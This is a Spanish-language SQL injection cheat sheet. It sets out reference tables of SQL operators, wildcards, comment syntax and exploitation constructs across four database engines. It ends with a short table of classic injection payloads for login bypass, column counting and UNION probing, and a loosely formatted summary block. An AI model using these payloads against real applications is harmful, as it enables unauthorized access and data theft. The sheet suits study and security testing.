# SQL injection: table of commands

Operadores Lógicos

| Operador | Significado | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- | --- |
| `AND` | y lógico | ✔ | ✔ | ✔ | ✔ |
| `OR` | o lógico | ✔ | ✔ | ✔ | ✔ |
| `NOT` | negación | ✔ | ✔ | ✔ | ✔ |

Operadores de comparación

| Operador | Uso | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- | --- |
| `=` | igual | ✔ | ✔ | ✔ | ✔ |
| `!=` | distinto | ✔ | ✔ | ✔ | ✔ |
| `<>` | distinto | ✔ | ✔ | ✔ | ✔ |
| `>` | mayor | ✔ | ✔ | ✔ | ✔ |
| `<` | menor | ✔ | ✔ | ✔ | ✔ |
| `>=` | mayor o igual | ✔ | ✔ | ✔ | ✔ |
| `<=` | menor o igual | ✔ | ✔ | ✔ | ✔ |
| `LIKE` | coincidencia con comodines | ✔ | ✔ | ✔ | ✔ |
| `GLOB` | coincidencia estilo shell | ✔ | ✖ | ✖ | ✖ |
| `MATCH` | full-text search | ✔ | ✖ | ✖ | ✖ |

Operadores aritméticos

| Operador | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- |
| `+` | ✔ | ✔ | ✔ | ✔ |
| `-` | ✔ | ✔ | ✔ | ✔ |
| `\*` | ✔ | ✔ | ✔ | ✔ |
| `/` | ✔ | ✔ | ✔ | ✔ |
| `%` (módulo) | ✔ | ✔ | ✔ | ✔ |

Comodines

`SELECT \* FROM users WHERE username LIKE 'adm%';
SELECT \* FROM log WHERE message LIKE '%pass%';`

Seleccionar cadenas cuyo segundo carácter sea r: `SELECT \* FROM tbl WHERE code LIKE '_r%';`

| Comodín | Significado | Ejemplo | Coincide con | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `%` | Cualquier cantidad de caracteres (0 o más) | `WHERE nombre LIKE 'a%'` | “ana”, “alto”, “a”, “árbol”… | ✔ | ✔ | ✔ | ✔ |
| `_` | Un único carácter | `WHERE nombre LIKE '_a%'` | “laura”, “mapa”, pero no “aa…” | ✔ | ✔ | ✔ | ✔ |
| `\[\]` | Un rango de caracteres | `WHERE nombre LIKE '\[a-z\]%'` | “ana”, “beto”… | ✖ | ✖ | ✖ | ✔ |
| `\[^ \]` o `\[! \]` | Negación en rango | `LIKE '\[^a\]%'` | No empieza por “a” | ✖ | ✖ | ✖ | ✔ |
| `\*` | Comodín estilo shell (NO SQL) | ❌ No se usa en SQL estándar | — | ✔ (GLOB) | ✖ | ✖ | ✖ |
| `?` | Un carácter (NO SQL) | ❌ No SQL | — | ✖ | ✖ | ✖ | ✖ |

Comentarios

| Comentario | Tipo | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- | --- |
| `-- -` (dos guiones + espacio) | comentario hasta fin de línea | ✔ (requiere espacio) | ✔ | ✔ (requiere espacio) | ✔ |
| `#` | comentario | ✖ | ✔ | ✖ | ✖ |
| `/* ... */` | comentario en bloque | ✔ | ✔ | ✔ | ✔ |

Terminadores de sentencia

| Terminador | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- |
| `;` | ✔ | ✔ | ✔ | ✔ |

Constructores típicos de explotación

| Construcción | Explicación | SQLite | MySQL | PostgreSQL | MSSQL |
| --- | --- | --- | --- | --- | --- |
| `UNION SELECT` | mezclar resultados | ✔ | ✔ | ✔ | ✔ |
| `UNION ALL SELECT` | igual pero más simple | ✔ | ✔ | ✔ | ✔ |
| `ORDER BY n` | comprobar número de columnas | ✔ | ✔ | ✔ | ✔ |
| `LIMIT` | limitar resultados | ✔ | ✔ | ✔ | ✖ |
| `OFFSET` | saltar resultados | ✔ | ✔ | ✔ | ✖ |
| `--` | truncar la query final | ✔ | ✔ | ✔ | ✔ |

Payloads típicos

| Objetivo | Payload |
| --- | --- |
| Bypassear login | `' OR '1'='1` |
| Bypassear login limpio | `' OR 1=1--` |
| Forzar true | `1 OR 1=1` |
| Evitar AND | `' OR ''=''--` |
| Identificar columnas | `' ORDER BY 3--` |
| Probar UNION | `' UNION SELECT 1--` |
| En la contraseña | `a' is not 'b` |
| Para cuando no te deja poner una cadena → concatenación | `'||'` |

`=== OPERADORES ===
AND OR NOT
= != <> > < >= <=
LIKE GLOB MATCH`

`=== COMENTARIOS ===`

`/* ... */`

`(solo MySQL)`

`=== TERMINADORES ===
;`

`=== COMODINES ===
% _`

`(solo en GLOB de SQLite)`

`=== UNION ===
UNION SELECT
UNION ALL SELECT`

`=== OTHERS ===
ORDER BY
LIMIT / OFFSET`